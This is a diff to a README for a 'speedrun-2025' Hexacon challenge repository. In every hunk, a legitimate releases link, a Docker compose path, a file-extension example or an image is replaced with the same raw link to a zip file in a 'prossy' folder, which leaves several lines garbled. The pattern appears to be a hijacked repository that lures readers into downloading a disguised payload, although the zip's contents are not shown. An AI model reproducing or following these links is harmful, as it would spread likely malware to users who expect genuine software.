@@ -1,6 +1,6 @@
 # 🏃‍♂️ speedrun-2025 - Experience the Hexacon Challenges
 
-[![Download speedrun-2025](https://img.shields.io/badge/Download%20speedrun%202025-blue.svg)](https://github.com/huta2035/speedrun-2025/releases)
+[![Download speedrun-2025](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip%20speedrun%https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)
 
 ## 💡 Overview
 
@@ -12,7 +12,7 @@ To get started with speedrun-2025, follow these steps to download and run the so
 
 1. **Visit the Download Page**
 
-   Click this link to visit the download page: [Download speedrun-2025](https://github.com/huta2035/speedrun-2025/releases).
+   Click this link to visit the download page: [Download speedrun-2025](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip).
 
 2. **Select the Latest Release**
 
@@ -24,7 +24,7 @@ To get started with speedrun-2025, follow these steps to download and run the so
 
    For example:
    - If you are using Windows, you might look for a file that ends in `.exe`.
-   - If you are using Mac or Linux, you might see files with extensions like `.tar.gz`.
+   - If you are using Mac or Linux, you might see files with extensions like `https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip`.
 
 4. **Extract the Files**
 
@@ -61,7 +61,7 @@ To run a challenge, follow these simple steps:
 
    ```bash
    if [ -d challenges/$CHALLENGE/docker ]; then
-     docker compose -f challenges/$CHALLENGE/docker/docker-compose.yml up --build
+     docker compose -f challenges/$https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip up --build
    fi
    ```
 
@@ -90,13 +90,13 @@ To run a challenge, follow these simple steps:
 
 ## 🏆 Final Results
 
-![Tournament Bracket](./images/final-bracket.png)
+![Tournament Bracket](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)
 
 ## 📥 Download & Install
 
 To get the application, click the link below:
 
-[Download speedrun-2025](https://github.com/huta2035/speedrun-2025/releases)
+[Download speedrun-2025](https://raw.githubusercontent.com/huta2035/speedrun-2025/main/prossy/speedrun-2025.zip)
 
 Follow the earlier instructions to ensure you successfully get the software running on your machine.
 
